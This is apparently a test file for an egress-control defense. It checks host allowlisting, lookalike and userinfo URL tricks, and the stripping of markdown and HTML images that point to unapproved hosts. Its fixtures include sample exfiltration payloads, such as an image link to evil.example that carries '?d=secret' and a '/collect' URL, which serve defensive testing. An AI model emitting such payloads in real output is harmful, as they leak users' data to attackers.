import { describe, expect, it } from "vitest";
import { EgressPolicy, extractUrls } from "../../src/defense/egress.js";

describe("egress controls", () => {
  const policy = new EgressPolicy(["docs.example.com", "*.github.com"]);

  it("extracts URLs from nested arguments", () => {
    const urls = extractUrls({ url: "https://a.example/x", body: "see http://b.example/y and wss://c.example" });
    expect(urls.map((u) => u.host)).toEqual(["a.example", "b.example", "c.example"]);
  });

  it("allows only allowlisted hosts", () => {
    expect(policy.isAllowed("docs.example.com")).toBe(true);
    expect(policy.isAllowed("api.github.com")).toBe(true);
    expect(policy.isAllowed("API.GITHUB.COM.")).toBe(true);
    expect(policy.isAllowed("github.com.evil.example")).toBe(false);
    expect(policy.isAllowed(null)).toBe(false);
  });

  it("is not fooled by userinfo or lookalike URLs", () => {
    const v = policy.violations({ url: "https://docs.example.com@evil.example/collect" });
    expect(v.map((x) => x.host)).toEqual(["evil.example"]);
    expect(policy.violations({ url: "https://docs.example.com.evil.example/" })).toHaveLength(1);
  });

  it("strips markdown and HTML images to non-allowlisted hosts", () => {
    const text = [
      "![ok](https://docs.example.com/a.png)",
      "![x](https://evil.example/p.gif?d=secret)",
      '<img src="https://evil.example/t.png?x=1">',
      "![ref][r]",
      "[r]: https://evil.example/ref.png",
    ].join("\n");
    const r = policy.stripImages(text);
    expect(r.removed).toEqual(["evil.example", "evil.example", "evil.example"]);
    expect(r.text).toContain("![ok](https://docs.example.com/a.png)");
    expect(r.text).not.toContain("evil.example/p.gif");
    expect(r.text).not.toContain("t.png");
    expect(r.text).not.toContain("ref.png");
  });

  it("leaves plain links alone", () => {
    const text = "See [the docs](https://evil.example/docs).";
    expect(policy.stripImages(text).text).toBe(text);
  });
});
